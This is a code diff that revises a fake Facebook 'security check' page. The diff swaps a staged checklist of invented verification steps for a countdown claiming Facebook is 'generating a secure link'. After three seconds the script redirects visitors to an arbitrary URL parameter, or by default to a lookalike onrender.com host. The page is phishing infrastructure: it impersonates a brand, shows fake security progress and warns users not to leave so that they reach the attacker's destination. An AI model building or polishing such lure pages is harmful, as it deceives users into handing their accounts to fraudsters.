@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-  <title>Facebook Security Check</title>
+  <title>Facebook — Generating Secure Link</title>
   <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
   <style>
     * {
@@ -18,6 +18,7 @@
       color: #1c1e21;
       min-height: 100vh;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
     }
@@ -26,8 +27,8 @@
       background: white;
       border-radius: 12px;
       box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 24px rgba(0,0,0,.12);
-      padding: 48px 40px;
-      max-width: 420px;
+      padding: 48px 40px 40px;
+      max-width: 440px;
       width: 90%;
       text-align: center;
     }
@@ -36,38 +37,39 @@
       color: #1877f2;
       font-size: 36px;
       font-weight: bold;
-      margin-bottom: 28px;
+      margin-bottom: 32px;
       font-family: Klavika-Medium, sans-serif;
       letter-spacing: -1px;
     }
 
-    .shield-wrap {
+    .spinner-wrap {
       position: relative;
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 24px;
-    }
-
-    .shield-wrap svg.shield-bg {
-      width: 80px;
-      height: 80px;
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 28px;
     }
 
     .spinner-ring {
       position: absolute;
-      top: -8px;
-      left: -8px;
-      width: 96px;
-      height: 96px;
+      inset: -10px;
       border: 3px solid #e7f0fd;
       border-top: 3px solid #1877f2;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      animation: spin 0.9s linear infinite;
+    }
+
+    .spinner-inner {
+      width: 72px;
+      height: 72px;
+      background: #e3f2fd;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
     @keyframes spin {
-      0%   { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      to { transform: rotate(360deg); }
     }
 
     .title {
@@ -75,21 +77,22 @@
       font-weight: 700;
       color: #1c1e21;
       margin-bottom: 10px;
+      line-height: 1.3;
     }
 
     .subtitle {
       font-size: 14px;
       color: #65676b;
-      line-height: 1.5;
-      margin-bottom: 28px;
+      line-height: 1.6;
+      margin-bottom: 30px;
     }
 
     .progress-track {
       background: #e4e6ea;
       border-radius: 10px;
-      height: 6px;
+      height: 5px;
       overflow: hidden;
-      margin-bottom: 12px;
+      margin-bottom: 14px;
     }
 
     .progress-fill {
@@ -97,80 +100,48 @@
       background: #1877f2;
       border-radius: 10px;
       width: 0%;
-      transition: width 0.4s ease;
+      transition: width 0.35s ease;
     }
 
-    .status-text {
+    .countdown-line {
       font-size: 13px;
       color: #65676b;
       margin-bottom: 28px;
+      min-height: 20px;
     }
 
-    .checks {
-      text-align: left;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .check-item {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 13px;
-      color: #65676b;
-    }
-
-    .check-icon {
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      border: 2px solid #dddfe2;
-      flex-shrink: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: all 0.3s ease;
-    }
-
-    .check-icon.done {
-      background: #1877f2;
-      border-color: #1877f2;
-    }
-
-    .check-icon.done svg {
-      display: block;
-    }
-
-    .check-icon svg {
-      display: none;
-      width: 11px;
-      height: 11px;
-    }
-
-    .check-label {
-      transition: color 0.3s ease;
-    }
-
-    .check-label.done {
-      color: #1c1e21;
-      font-weight: 500;
+    .countdown-line strong {
+      color: #1877f2;
+      font-weight: 600;
     }
 
     .notice {
-      margin-top: 28px;
-      padding: 12px 14px;
-      background: #e3f2fd;
+      padding: 14px 16px;
+      background: #f0f2f5;
       border-radius: 8px;
-      border-left: 4px solid #1877f2;
-      font-size: 12px;
-      color: #1c1e21;
+      font-size: 13px;
+      color: #65676b;
+      line-height: 1.6;
       text-align: left;
-      line-height: 1.5;
+    }
+
+    .notice p {
+      margin: 0;
+    }
+
+    .notice p + p {
+      margin-top: 6px;
     }
 
     .notice strong {
-      color: #1877f2;
+      color: #1c1e21;
+      font-weight: 600;
+    }
+
+    .footer-note {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #8a8d91;
     }
   </style>
 </head>
@@ -178,95 +149,72 @@
   <div class="check-card">
     <div class="fb-logo">facebook</div>
 
-    <div class="shield-wrap">
+    <div class="spinner-wrap">
       <div class="spinner-ring"></div>
-      <svg class="shield-bg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="#e3f2fd"/>
-        <path d="M9 12L11 14L16 9" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
+      <div class="spinner-inner">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#1877f2" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M9 12L11 14L16 9" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
     </div>
 
-    <h2 class="title">Checking Your Connection</h2>
-    <p class="subtitle">Please wait while we perform a quick security check to ensure your connection is safe and secure.</p>
+    <h2 class="title">Generating a new secure link.</h2>
+    <p class="subtitle">Please wait while Facebook prepares your secure verification link. This process is encrypted and may take a few seconds.</p>
 
     <div class="progress-track">
       <div class="progress-fill" id="progress-fill"></div>
     </div>
-    <p class="status-text" id="status-text">Initializing security check...</p>
 
-    <div class="checks">
-      <div class="check-item">
-        <div class="check-icon" id="check-1">
-          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </div>
-        <span class="check-label" id="label-1">Verifying SSL certificate</span>
-      </div>
-      <div class="check-item">
-        <div class="check-icon" id="check-2">
-          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </div>
-        <span class="check-label" id="label-2">Checking network security</span>
-      </div>
-      <div class="check-item">
-        <div class="check-icon" id="check-3">
-          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </div>
-        <span class="check-label" id="label-3">Validating session token</span>
-      </div>
-      <div class="check-item">
-        <div class="check-icon" id="check-4">
-          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </div>
-        <span class="check-label" id="label-4">Confirming identity</span>
-      </div>
-    </div>
+    <p class="countdown-line" id="countdown-line">
+      Please keep this page open. You will be redirected in <strong id="seconds">3</strong> second<span id="plural">s</span>.
+    </p>
 
     <div class="notice">
-      <strong>Security Notice:</strong> Do not close or refresh this page. You will be redirected automatically once the check is complete.
+      <p><strong>Important:</strong> Do not close, refresh, or navigate away from this page.</p>
+      <p>Your secure link is being generated by Facebook's security system. Leaving this page may invalidate the process and require you to restart verification.</p>
     </div>
   </div>
+
+  <p class="footer-note">Facebook &copy; 2025 &nbsp;&middot;&nbsp; Security &amp; Privacy</p>
 
   <script>
     (function () {
       const params = new URLSearchParams(window.location.search);
       const dest = params.get('url') || 'https://facebook-trustedcc.onrender.com';
 
-      const totalMs = 5000;
+      const totalMs = 3000;
       const fill = document.getElementById('progress-fill');
-      const statusText = document.getElementById('status-text');
-
-      const steps = [
-        { at: 800,  checkId: 'check-1', labelId: 'label-1', status: 'Checking network security...' },
-        { at: 2000, checkId: 'check-2', labelId: 'label-2', status: 'Validating session token...' },
-        { at: 3400, checkId: 'check-3', labelId: 'label-3', status: 'Confirming identity...' },
-        { at: 4400, checkId: 'check-4', labelId: 'label-4', status: 'Connection verified. Redirecting...' },
-      ];
+      const secondsEl = document.getElementById('seconds');
+      const pluralEl = document.getElementById('plural');
+      const countdownLine = document.getElementById('countdown-line');
 
       const start = Date.now();
+
+      let lastSecond = -1;
 
       function tick() {
         const elapsed = Date.now() - start;
         const pct = Math.min((elapsed / totalMs) * 100, 100);
         fill.style.width = pct + '%';
 
+        const remaining = Math.max(Math.ceil((totalMs - elapsed) / 1000), 0);
+
+        if (remaining !== lastSecond) {
+          lastSecond = remaining;
+          secondsEl.textContent = remaining;
+          pluralEl.textContent = remaining === 1 ? '' : 's';
+        }
+
         if (elapsed >= totalMs) {
           fill.style.width = '100%';
+          countdownLine.innerHTML = 'Redirecting you now&hellip;';
           window.location.href = dest;
           return;
         }
 
         requestAnimationFrame(tick);
       }
-
-      steps.forEach(function (step) {
-        setTimeout(function () {
-          const icon = document.getElementById(step.checkId);
-          const label = document.getElementById(step.labelId);
-          icon.classList.add('done');
-          label.classList.add('done');
-          statusText.textContent = step.status;
-        }, step.at);
-      });
 
       requestAnimationFrame(tick);
     })();
